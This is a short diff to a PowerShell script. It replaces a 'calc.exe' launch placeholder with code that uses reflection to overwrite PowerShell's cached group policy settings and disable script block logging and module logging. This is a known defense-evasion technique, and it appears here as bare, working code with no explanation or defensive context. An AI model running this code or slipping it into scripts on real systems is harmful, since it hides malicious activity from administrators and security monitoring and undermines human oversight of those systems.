@@ -1,1 +1,7 @@
-Start-Process calc.exe
+$GroupPolicySettings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static').GetValue($null)
+
+$GroupPolicySettings['ScriptBlockLogging'] = @{}
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+
+$GroupPolicySettings['ModuleLogging'] = @{}
+$GroupPolicySettings['ModuleLogging']['EnableModuleLogging'] = 0
